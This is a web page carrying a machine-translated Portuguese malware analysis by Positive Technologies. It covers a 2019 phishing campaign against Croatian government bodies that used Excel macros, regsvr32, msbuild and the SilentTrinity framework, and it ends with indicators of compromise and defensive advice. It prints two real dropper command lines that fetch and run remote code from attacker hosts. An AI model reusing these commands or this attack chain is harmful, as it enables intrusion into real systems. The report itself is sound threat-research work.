<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üë±üèø ‚ú® üîô IronPython do lado do mal: como descobrimos um ataque cibern√©tico a servi√ßos p√∫blicos em um pa√≠s europeu üîû üîà üõ∑</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Nossos especialistas do centro de seguran√ßa especializado sempre acompanham e monitoram o surgimento de novas amea√ßas interessantes e perigosas. Foi a...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>IronPython do lado do mal: como descobrimos um ataque cibern√©tico a servi√ßos p√∫blicos em um pa√≠s europeu</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/company/pt/blog/458766/"> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><img src="https://habrastorage.org/getpro/habr/post_images/558/531/383/5585313839721f1220fe25cf6093e16a.png" alt="imagem"></a> <br><br>  Nossos especialistas do centro de seguran√ßa especializado sempre acompanham e monitoram o surgimento de novas amea√ßas interessantes e perigosas.  Foi assim que, no in√≠cio de abril de 2019, foi descoberto um ataque direcionado ao governo croata.  Este relat√≥rio examinou a cadeia de entrega de malware no computador da v√≠tima, apresentou indicadores de comprometimento e observou o uso de uma nova estrutura p√≥s-operacional que, de acordo com nossos dados, nunca foi usada pelos invasores. <a name="habracut"></a><br><br><h2>  Infec√ß√£o por v√≠tima </h2><br>  Em 2 de abril de 2019, durante um monitoramento de rotina de v√°rios recursos para novos malwares, os especialistas do PT Expert Security Center descobriram um documento incomum do escrit√≥rio. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/719/16e/e61/71916ee61f47e529490f3da0ca0db121.png" alt="imagem"><br><br>  <i>Figura 1. Documento malicioso</i> <br><br>  A notifica√ß√£o de envio foi criada no aplicativo de escrit√≥rio do MS Excel e salva no formato XLS antigo um dia antes (01-04-2019 16:28:07 (UTC)).  No entanto, o carimbo de data / hora dispon√≠vel na imprensa (2018-07-25 00:12:30 (UTC)) indica que o documento foi usado em 2018.  Voltaremos a esse sintoma indireto abaixo. <br><br>  Vale ressaltar que o campo Coment√°rios (que pode ser alterado, inclusive usando o aplicativo MS Excel) cont√©m um comando no shell do Windows: <br><br><pre><code class="bash hljs">cmd.exe /c <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> Set objShell = CreateObject(<span class="hljs-string"><span class="hljs-string">"Wscript.Shell"</span></span>): objShell.Run <span class="hljs-string"><span class="hljs-string">"net use https://postahr.vip"</span></span>, 0, False: Wscript.Sleep 10000: objShell.Run <span class="hljs-string"><span class="hljs-string">"regsvr32 /u /n /s /i:https://postahr.vip/page/1/update.sct scrobj.dll"</span></span>, 0, False: Set objShell = Nothing &gt; C:\users\%username%\appdata\<span class="hljs-built_in"><span class="hljs-built_in">local</span></span>\microsoft\silent.vbs</code> </pre> <br><img src="https://habrastorage.org/getpro/habr/post_images/557/a53/082/557a53082352f47cc4c079305408a7cc.png" alt="imagem"><br><br>  <i>Figura 2. O campo "Coment√°rios" com conte√∫do suspeito</i> <br><br><img src="https://habrastorage.org/getpro/habr/post_images/a93/f80/6e8/a93f806e8dca3dfb1a81ee0da457da95.png" alt="imagem"><br><br>  <i>Figura 3. O conte√∫do do campo Coment√°rios em formato bin√°rio</i> <br><br>  Como resultado da execu√ß√£o desse comando, o sistema cria um script na linguagem Visual Basic, que, quando iniciada, executa as seguintes a√ß√µes: <br><br><ul><li>  conectar um recurso de rede usando a tecnologia WebDAV, </li><li>  baixe e execute o arquivo do pr√≥ximo est√°gio da infec√ß√£o usando o utilit√°rio de sistema leg√≠timo regsvr32. </li></ul><br>  Quando um recurso de rede √© conectado via HTTP (S), uma solicita√ß√£o NTLM √© enviada ao servidor atacante, com a ajuda da qual o hash NTLM pode ser restaurado.  Em seguida, o hash recebido pode ser usado para autoriza√ß√£o em servi√ßos em nome da v√≠tima.  N√£o encontramos vest√≠gios desses ataques, e os motivos para conectar um recurso de rede permanecem incertos. <br><br>  A t√©cnica de usar o regsvr32 (gerenciamento de controles ActiveX) para fins maliciosos n√£o √© nova e ainda tem um nome - Squiblydoo.  Os invasores o utilizam para cumprir os requisitos para controlar o lan√ßamento de programas confi√°veis, al√©m de ignorar a detec√ß√£o de antiv√≠rus. <br><br>  Por si s√≥, o texto no campo Coment√°rios √© inofensivo e sua execu√ß√£o deve ser de alguma forma condicionada.  Quando a v√≠tima abre o documento Excel recebido, aparece uma mensagem de intercepta√ß√£o no idioma croata informando a inclus√£o de macros: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/97d/8a4/b5a/97d8a4b5a0406ebef6d02ea3c8b1b994.png" alt="imagem"><br><br>  <i>Figura 4. Capturar mensagem ap√≥s abrir um documento</i> <br><br>  Se macros forem permitidas, o usu√°rio ver√° uma notifica√ß√£o de pacote falsa com o logotipo postal croata: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/d64/2d3/1e2/d642d31e23e0d4fa7ca34dc652ad522b.png" alt="imagem"><br><br>  <i>Figura 5. Notifica√ß√£o de pacote falso</i> <br><br>  Enquanto isso, usando as ferramentas de macro, o script para o campo Coment√°rios ser√° executado e o script criado no sistema ser√° adicionado √† inicializa√ß√£o: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/678/7ab/4aa/6787ab4aab57ef3ad22b190c2474f8c5.png" alt="imagem"><br><br>  <i>Figura 6. L√≥gica macro principal</i> <br><br>  Curiosamente, o script que est√° sendo criado n√£o √© acionado por uma macro.  Talvez essa seja a inten√ß√£o do invasor: o pr√≥ximo est√°gio da infec√ß√£o ocorrer√° ap√≥s a reinicializa√ß√£o do sistema e o login do usu√°rio.  Voltaremos a esse detalhe abaixo. <br><br>  Parte do cen√°rio √© interessante √† sua maneira: uma estrutura de c√≥digo elegante com formata√ß√£o, recuo e outras nuances de marca√ß√£o pode ser um sinal do uso de c√≥digo de terceiros e at√© mesmo um programa que permite criar esses documentos automaticamente. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/ba4/e7c/2cc/ba4e7c2ccb1eeb9bb4a2de8dbf8dda13.png" alt="imagem"><br><br>  <i>Figura 7. Parte da macro presumivelmente emprestada</i> <br><br>  A pesquisa por palavra-chave fornece muitos trechos de c√≥digo semelhantes em diferentes recursos.  Estamos inclinados a acreditar que o hacker simplesmente encontrou o c√≥digo do programa apropriado e o ajustou um pouco para executar as a√ß√µes necess√°rias: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/899/608/9fc/8996089fca65afdf132c69c6d943a6fa.png" alt="imagem"><br><br>  <i>Figura 8. Exemplo de macro semelhante no issuu.com</i> <br><br><img src="https://habrastorage.org/getpro/habr/post_images/fa5/c22/3f6/fa5c223f681efa6950cb71067f26c877.png" alt="imagem"><br><br>  <i>Figura 9. Um exemplo de macro semelhante em stackoverflow.com</i> <br><br><img src="https://habrastorage.org/getpro/habr/post_images/1dd/bdb/f59/1ddbdbf592989692bc8d15712f638f37.png" alt="imagem"><br><br>  <i>Figura 10. Exemplo de uma macro semelhante em dummies.com</i> <br><br>  Vamos retornar ao pr√≥ximo est√°gio de infec√ß√£o usando o utilit√°rio regsvr32.  Quando o comando √© executado, o scriptlet update.sct em JavaScript ser√° baixado do servidor do invasor.  O corpo do script cont√©m dados bin√°rios codificados pelo algoritmo Base64.  Ap√≥s a decodifica√ß√£o, os dados recebidos ser√£o desserializados e executados usando a plataforma de software .NET Framework. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/0e0/d7d/9f8/0e0d7d9f8b6324b3aadce5a203d28075.png" alt="imagem"><br><br>  <i>Figura 11. O script update.sct baixado do servidor do atacante</i> <br><br>  Vale ressaltar que esse c√≥digo tamb√©m foi emprestado pelo invasor em um dos recursos p√∫blicos: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/b26/b9c/673/b26b9c673c0aace886123fc47b3d70c4.png" alt="imagem"><br><br>  <i>Figura 12. Um exemplo de c√≥digo semelhante no rastamouse.me</i> <br><br><img src="https://habrastorage.org/getpro/habr/post_images/25e/5ec/aef/25e5ecaeff7cebf201d5781fb8423ddc.png" alt="imagem"><br><br>  <i>Figura 13. Um exemplo de c√≥digo semelhante no github.com</i> <br><br>  N√£o parece que o hacker tenha se aprofundado na l√≥gica das ferramentas usadas.  Por exemplo, no scriptlet considerado, a fun√ß√£o setversion √© chamada, o que n√£o faz nada.  Um exemplo dispon√≠vel na web tamb√©m parece. <br><br>  O objeto descompactado e iniciado √© um arquivo PE execut√°vel na plataforma .NET. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/20f/274/650/20f274650305046ab50359cd089a517d.png" alt="imagem"><br><br>  <i>Figura 14. O cabe√ßalho do arquivo PE execut√°vel</i> <br><br><img src="https://habrastorage.org/getpro/habr/post_images/cf6/946/d54/cf6946d543b6b8a02f79bc06b3470d7e.png" alt="imagem"><br><br>  <i>Figura 15. Informa√ß√µes de depura√ß√£o do arquivo SharpPick PE</i> <br><br>  Como resultado da compila√ß√£o, o caminho para o projeto com o c√≥digo fonte foi preservado.  O sufixo -master indica que o projeto foi clonado anteriormente no reposit√≥rio e o diret√≥rio SharpPick leva a um aplicativo conhecido que permite baixar e executar o c√≥digo do PowerShell sem usar diretamente o interpretador de idiomas, mas usando as depend√™ncias do .NET. <br>  Apesar da disponibilidade do projeto do utilit√°rio SharpPick no GitHub, verifique se nenhuma altera√ß√£o significativa foi feita. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/300/f5f/689/300f5f689737fae0872ddaaaec6d5fbc.png" alt="imagem"><br><br>  <i>Figura 16. Parte do c√≥digo do utilit√°rio SharpPick descompilado</i> <br><br>  Como resultado da descompila√ß√£o, um pseudoc√≥digo foi obtido, durante o qual √© decodificado a partir do Base64 e o script do PowerShell √© iniciado: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/fd7/9c0/dae/fd79c0dae768b4bc3e6bd8916b871c4a.png" alt="imagem"><br><br>  <i>Figura 17. Script do PowerShell parcialmente convertido</i> <br><br>  Depois de simplificar o c√≥digo, n√£o √© dif√≠cil analisar sua l√≥gica: <br><br><ul><li>  um objeto √© formado para interagir com o servidor da Web com as configura√ß√µes especificadas de User-Agent, Cookie e proxy; </li><li>  a carga √∫til √© carregada no endere√ßo especificado; </li><li>  o resultado √© descriptografado pelo algoritmo RC4 usando a chave especificada e iniciado. </li></ul><br>  Infelizmente, durante nossa pesquisa, o servidor de gerenciamento j√° estava indispon√≠vel.  Os dados que foram recebidos dele mais cedo, n√£o conseguimos encontrar.  No entanto, desta vez, h√° informa√ß√µes suficientes na Web (exemplo: relat√≥rio de nossos colegas da <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=https://www.google.com/url%3Fq%3D">FireEye</a> ) para estabelecer inequivocamente: o elo final nesta cadeia de infec√ß√£o √© o Empire backdoor, uma ferramenta para administra√ß√£o remota do computador da v√≠tima como parte da estrutura p√≥s-operacional do Empire Framework. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/b7e/a88/eab/b7ea88eab8ddfb21880d2f2a8b04f51d.png" alt="imagem"><br><br>  <i>Figura 18. Usando um script semelhante do PowerShell para atacar vulnerabilidades no WinRAR</i> <br><br>  Curiosamente, outros padr√µes de script levam a um extenso artigo sobre t√©cnicas de teste de penetra√ß√£o, com aten√ß√£o especial para ocultar a infraestrutura de invasores atr√°s de servidores proxy.  A fonte mais prov√°vel de informa√ß√£o usada pelo invasor √© um artigo de colegas da Payatu Technologies, onde eles <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=https://www.google.com/url%3Fq%3D">fornecem</a> instru√ß√µes detalhadas sobre o redirecionamento de sess√µes para recursos leg√≠timos, bloqueio de pacotes indesejados, registro etc., incluindo o uso do Empire. <br><br>  Algumas horas depois, encontramos outro documento no pacote.  Tem muitas semelhan√ßas com a anterior: tamb√©m encontrada na Cro√°cia (2019-04-02 16:52:56 (UTC)), tem o mesmo nome e at√© uma imagem de armadilha sobre o pacote recebido.  Mas ainda existem diferen√ßas. <br><br>  O c√≥digo malicioso est√° novamente localizado no campo Coment√°rios, mas desta vez a l√≥gica das a√ß√µes foi alterada. <br><br><pre> <code class="bash hljs">cmd.exe /c <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> Set objShell = CreateObject(<span class="hljs-string"><span class="hljs-string">"Wscript.Shell"</span></span>):objShell.Run <span class="hljs-string"><span class="hljs-string">"C:\windows\system32\cmd.exe /c net use \\176.105.255.59\webdav"</span></span>,0:Wscript.Sleep 60000: objShell.Run <span class="hljs-string"><span class="hljs-string">"%windir%\Microsoft.Net\Framework\v4.0.30319\msbuild.exe \\176.105.255.59\webdav\msbuild.xml"</span></span> , 0, False: Set objShell = Nothing &gt; C:\users\%username%\appdata\<span class="hljs-built_in"><span class="hljs-built_in">local</span></span>\microsoft\silent.vbs</code> </pre> <br><ul><li>  O recurso de rede est√° conectado usando o protocolo SMB. </li><li>  Baixe e inicie o pr√≥ximo est√°gio de infec√ß√£o usando o msbuild, um utilit√°rio leg√≠timo do pacote .NET Framework. </li></ul><br>  √â interessante que a linha webdav esteja presente no endere√ßo do diret√≥rio montado, vinculando indiretamente esse caso ao anterior.  Desta vez, um ataque ao hash NTLM ainda √© poss√≠vel, embora n√£o haja evid√™ncias de seu uso.  Novamente, um aplicativo leg√≠timo (desta vez msbuild) √© usado para ignorar com √™xito a restri√ß√£o ao iniciar programas de terceiros.  Antes de descrever a t√©cnica do abuso, mencionamos as diferen√ßas no c√≥digo do programa da macro de um novo documento. <br><br>  Os invasores n√£o fizeram altera√ß√µes significativas na l√≥gica do script do VBA.  Mas √© importante notar que desta vez eles n√£o apenas fornecem o carregamento autom√°tico do script VBS criado no sistema, mas tamb√©m o iniciam quando o documento √© aberto.  Provavelmente, no caso anterior, os atacantes simplesmente se esqueceram e, depois de algum tempo, tendo descoberto um erro, eles o corrigiram na nova vers√£o do documento. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/77d/670/2b3/77d6702b3bc07650a4f462b62cf975fd.png" alt="imagem"><br><br>  <i>Figura 19. Compara√ß√£o de c√≥digo de macro em dois documentos</i> <br><br>  O pr√≥ximo est√°gio da infec√ß√£o √© um documento XML que cont√©m c√≥digo C #.  Um recurso do utilit√°rio msbuild permite compilar e executar o c√≥digo contido em tempo real, conforme evidenciado pelos coment√°rios deixados pelo hacker no in√≠cio da marca√ß√£o. <br><br>  O buffer Base64 √© novamente apresentado no c√≥digo, que ser√° decodificado, descomprimido pelo algoritmo Deflate e iniciado.  Acreditamos que o leitor j√° percebe que, dessa vez, o invasor tamb√©m usou um modelo de acesso livre, conforme evidenciado pelos coment√°rios mencionados e por muitas fontes na Web com o mesmo c√≥digo. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/d68/6ea/4ac/d686ea4acff8cb52067c0c53cb6bf749.png" alt="imagem"><br><br>  <i>Figura 20. A tarefa msbuild.xml baixada do servidor atacante</i> <br><br>  Como resultado, desta vez, um arquivo PE na plataforma .NET ser√° carregado e executado na mem√≥ria.  E as informa√ß√µes de depura√ß√£o cont√™m n√£o apenas um sinal de que o projeto foi coletado em uma m√°quina virtual (possivelmente para ocultar informa√ß√µes sobre o invasor), mas tamb√©m o diret√≥rio SILENTTRINITY, no qual abordaremos mais detalhadamente. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/adf/3fe/653/adf3fe65355eb2c7418a5438afc5aa34.png" alt="imagem"><br><br>  <i>Figura 21. Informa√ß√µes de depura√ß√£o do arquivo SILENTTRINITY PE</i> <br><br>  Depois de estudar esses dois documentos de encomendas, encontramos mais dois.  O formato do arquivo, o nome e a imagem de intercepta√ß√£o com a regi√£o especificada permaneceram inalterados.  Os documentos estavam dispon√≠veis no final de agosto de 2018, o que confirma a hip√≥tese sobre a natureza de longo prazo da campanha, sobre a qual escrevemos no in√≠cio do relat√≥rio. <br><br>  √â curioso que os hackers do ano passado n√£o usaram o campo "Coment√°rios", mas lan√ßaram utilit√°rios leg√≠timos.  O componente malicioso foi carregado usando o utilit√°rio para trabalhar com certificados e opera√ß√µes criptogr√°ficas certutil, e o lan√ßamento foi fornecido pelas ferramentas de gerenciamento do sistema WMI: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/95b/f2f/5a9/95bf2f5a9dc3693dd275bc9153e2a364.png" alt="imagem"><br><br>  <i>Figura 22. Compara√ß√£o de macros de documento de 2018</i> <br><br>  Infelizmente, ap√≥s a limita√ß√£o do que aconteceu, n√£o conseguimos estabelecer os links subsequentes na cadeia de ataques de 2018. <br><br>  Tamb√©m √© importante notar que parte do c√≥digo de script do VBA permaneceu inalterada, com exce√ß√£o dos coment√°rios auxiliares exclu√≠dos que explicam a l√≥gica do trabalho. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/ef4/16b/9ee/ef416b9ee48a47b9795cf24db66b7555.png" alt="imagem"><br><br>  <i>Figura 23. Compara√ß√£o de macros de 2019 e 2018</i> <br><br><h2>  Estrutura do SilentTrinity </h2><br>  Os resultados da pesquisa da palavra-chave SILENTTRINITY a partir das informa√ß√µes de depura√ß√£o do arquivo PE podem determinar facilmente a origem desse link de ataque.  Em outubro de 2018, Marcello Salvati (pesquisador da Black Hills Information Security) publicou um projeto chamado SILENTTRINITY no popular reposit√≥rio GitHub.  A id√©ia principal: usar a flexibilidade e as vantagens da conhecida estrutura do PowerShell p√≥s-operacional na linguagem de programa√ß√£o Python Python, a saber, o IronPython.  O projeto est√° sendo desenvolvido at√© hoje. <br><br>  N√£o vamos nos aprofundar nos detalhes do trabalho e na implementa√ß√£o do projeto (principalmente porque o autor falou detalhadamente sobre isso em seu <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=https://www.google.com/url%3Fq%3D">relat√≥rio</a> ).  Vamos destacar apenas a l√≥gica b√°sica do trabalho e pontos interessantes na implementa√ß√£o. <br><br>  Ap√≥s iniciar o arquivo PE (no entanto, o link intermedi√°rio pode estar em um formato diferente), ocorre o seguinte: <br><br><ul><li>  acesso ao servidor de gerenciamento para baixar o arquivo ZIP com as depend√™ncias necess√°rias e o script principal do Python; </li><li>  o conte√∫do do arquivo √© extra√≠do sem salvar no disco; </li><li>  as depend√™ncias s√£o registradas para o processamento bem-sucedido de scripts Python; </li><li>  O script principal do Python √© iniciado, aguardando a tarefa do invasor; </li><li>  cada tarefa √© transferida como um script Python pronto; </li><li>  a tarefa √© executada no lado da v√≠tima em um thread separado; </li><li>  o resultado do trabalho √© transferido de volta para o servidor de gerenciamento. </li></ul><br><img src="https://habrastorage.org/getpro/habr/post_images/ed9/250/ca2/ed9250ca2557c5f70ff18d60c33f1b31.png" alt="imagem"><br><br>  <i>Figura 24. Diagrama de opera√ß√£o da estrutura SilentTrinity</i> <br><br>  Dentre os recursos, vale destacar o seguinte: <br><br><ul><li>  Suporte para o IronPython, incluindo a linguagem Boo (um subconjunto do IronPython com forte digita√ß√£o de dados). </li><li>  Toda atividade n√£o requer espa√ßo em disco: depend√™ncias, scripts, tarefas est√£o localizadas na mem√≥ria (ataque sem arquivo). </li><li>  Arquive com depend√™ncias, tarefas, o resultado do trabalho das equipes - toda a comunica√ß√£o entre a v√≠tima e o hacker √© criptografada com o algoritmo AES. </li><li>  A chave compartilhada √© gerada pelo protocolo Diffie-Hellman. </li><li>  O transporte de rede √© fornecido no n√≠vel do protocolo HTTP (S) com suporte a proxy. </li></ul><br><img src="https://habrastorage.org/getpro/habr/post_images/558/531/383/5585313839721f1220fe25cf6093e16a.png" alt="imagem"><br><br>  <i>Figura 25. Exemplo de interface do usu√°rio do lado do servidor da estrutura SilentTrinity</i> <br><br>  Curiosamente, no dia dos ataques, o carregador de PE foi carregado no servi√ßo VirusTotal, onde nenhum fornecedor de antiv√≠rus o identificou como malicioso.  Isso n√£o √© surpreendente: primeiro, o arquivo bin√°rio n√£o chega ao disco e a detec√ß√£o de assinaturas n√£o faz muito sentido;  segundo, a detec√ß√£o est√°tica est√° longe de ser a √∫nica tecnologia para proteger os usu√°rios. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/d24/126/15c/d2412615ccb6eadccf22c7bec91aa7ec.png" alt="imagem"><br><br>  <i>Figura 26. Resultado da verifica√ß√£o do carregador de inicializa√ß√£o SilentTrinity no dia do ataque</i> <br><br>  Al√©m disso, alguns dias ap√≥s o ataque, os vereditos de detec√ß√£o ainda come√ßaram a aparecer.  √â importante que, durante o per√≠odo dos ataques, o equipamento de prote√ß√£o ainda n√£o esteja equipado com algoritmos de detec√ß√£o ou a amea√ßa n√£o seja conhecida em princ√≠pio. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/e6e/3f2/9d9/e6e3f29d93ff8aa9053c3e7dc4ac30ce.png" alt="imagem"><br><br>  <i>Figura 27. O resultado atual da varredura do carregador de inicializa√ß√£o SilentTrinity</i> <br><br>  Provavelmente, esse foi o motivo da escolha dessa solu√ß√£o para a realiza√ß√£o de ataques.  N√£o temos informa√ß√µes de que a estrutura SilentTrinity j√° tenha sido usada em ataques maliciosos antes. <br><br>  Infraestrutura usada pelos invasores <br><br>  Vale ressaltar que a infraestrutura de rede usada pelos hackers est√° cronologicamente relacionada a ataques em andamento. <br><br><img src="https://habrastorage.org/webt/9u/uq/ug/9uuqugtgx2tbnobx9tjhadnbldk.png"><br><br>  <i>Tabela 1. Informa√ß√µes sobre os dom√≠nios usados ‚Äã‚Äãcomo servidores atacantes</i> <i><br></i> <br><br>  Os dom√≠nios foram criados de maneira a se parecer com recursos atacados leg√≠timos.  Isso permite que os usu√°rios obtenham confian√ßa em ataques de phishing.  Observe que os recursos envolvidos n√£o se limitam √† Cro√°cia. <br><br>  Todos os dom√≠nios s√£o registrados usando a tecnologia de seguran√ßa WhoisGuard.  Ele permite ocultar as informa√ß√µes reais sobre o registrante do dom√≠nio, a fim de proteger contra spam, enquanto os invasores usam essa tecnologia para anonimiza√ß√£o. <br><br>  Servidores que distribuem e gerenciam malware foram alugados pelo provedor holand√™s Breezle. <br><br>  Todas as informa√ß√µes dispon√≠veis sobre os n√≥s, endere√ßos e dom√≠nios dos atacantes com muitas conex√µes entre si nos permitem julgar os grandes volumes de malware que os invasores tinham neste momento.  N√£o exclu√≠mos que na campanha possam ser usadas ferramentas semelhantes √†s consideradas e alguns casos de infec√ß√£o permanecem sem solu√ß√£o. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/88d/308/4a4/88d3084a4fdcc666d13cb22d0f7ca88a.png" alt="imagem"><br><br>  <i>Figura 28. Representa√ß√£o gr√°fica da infraestrutura de um invasor</i> <br><br><h2>  Conclus√£o </h2><br>  Um dia ap√≥s a descoberta dos documentos nas <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=https://www.google.com/url%3Fq%3D">not√≠cias</a> , foi emitido um comunicado de imprensa com um <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=https://www.google.com/url%3Fq%3D">link</a> para o Departamento Croata de Seguran√ßa dos Sistemas de Informa√ß√£o sobre ataques de phishing direcionados.  Foram encontrados vest√≠gios em v√°rios √≥rg√£os governamentais do pa√≠s.  √â relatado que os emails foram enviados √†s v√≠timas com um link para um site de phishing a partir do qual foi proposto o download de um documento malicioso a partir do qual nossa an√°lise come√ßou.  Isso preenche os elos ausentes na cadeia de ataques e, no final, gostar√≠amos de prestar aten√ß√£o aos m√©todos de prote√ß√£o que podem reduzir o dano causado por esses ataques: <br><br><ul><li>  Monitorando e controlando o uso de alguns programas confi√°veis ‚Äã‚Äã(certutil, regsvr32, msbuild, net, wmic ...) </li><li>  Verificando e analisando n√£o apenas anexos em emails, mas tamb√©m links da web </li><li>  Verifica√ß√µes peri√≥dicas da mem√≥ria do PC em uma rede corporativa </li><li>  Conex√µes bem-sucedidas ao C2 Silent Trinity (mesmo sob TLS) podem ser detectadas usando o <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">PT Network Attack Discovery</a> , al√©m disso, em <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">nosso reposit√≥rio, publicamos detec√ß√µes para a comunidade.</a> </li></ul><br>  <b>Postado por</b> Alexey Vishnyakov, Positive Technologies <br><br>  PS Sobre esse assunto, o autor tamb√©m leu um relat√≥rio no Positive Hack Days 9. O v√≠deo desta e de outras apresenta√ß√µes est√° dispon√≠vel em: <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">www.phdays.com/en/broadcast/</a> . <br><br><div class="spoiler">  <b class="spoiler_title">Indicadores de compromisso:</b> <div class="spoiler_text">  0adb7204ce6bde667c5abd31e4dea164 <br>  13db33c83ee680e0a3b454228462e73f <br>  78184cd55d192cdf6272527c62d2ff89 <br>  79e72899af1e50c18189340e4a1e46e0 <br>  831b08d0c650c8ae9ab8b4a10a199192 <br>  92530d1b546ddf2f0966bbe10771521f <br>  c84b7c871bfcd346b3246364140cd60f <br>  hxxps: //postahr.vip/page/1/update.sct <br>  hxxps: //posteitaliane.live/owa/mail/archive.srf <br>  hxxps: //konzum.win/bat3.txt <br>  hxxp: //198.46.182.158/bat3.txt <br>  hxxps: //176.105.255.59: 8089 <br>  [\\] 176.105.255.59 \ webdav \ msbuild.xml <br>  postahr.online <br>  176.105.254.52 <br>  93.170.105.32 </div></div></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/pt458766/">https://habr.com/ru/post/pt458766/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../pt458754/index.html">GPS para escaravelho: sistema de orienta√ß√£o multimodal</a></li>
<li><a href="../pt458756/index.html">Como aprendemos a ser orientados por dados com o GoPractice Simulator</a></li>
<li><a href="../pt458758/index.html">O esplendor e a pobreza da literatura traduzida</a></li>
<li><a href="../pt458760/index.html">A exposi√ß√£o de Las Vegas √© para desenvolvedores de eletr√¥nicos, n√£o para consumidores. Um relat√≥rio da Design Automation Conference</a></li>
<li><a href="../pt458764/index.html">Pr√°ticas √°geis b√°sicas para equipes t√©cnicas e n√£o t√©cnicas em 2019</a></li>
<li><a href="../pt458768/index.html">5-6 raz√µes para vir para GolangConf</a></li>
<li><a href="../pt458770/index.html">Toda a verdade sobre o RTOS. Artigo 29. Interrup√ß√µes no N√∫cleo SE</a></li>
<li><a href="../pt458774/index.html">DBMS funcional</a></li>
<li><a href="../pt458778/index.html">Mecanismo de relat√≥rios do Satellite 6.5: o que e por qu√™</a></li>
<li><a href="../pt458782/index.html">Adapta√ß√£o de programas do ZX Spectrum ao TR-DOS por meios modernos. Parte 3</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
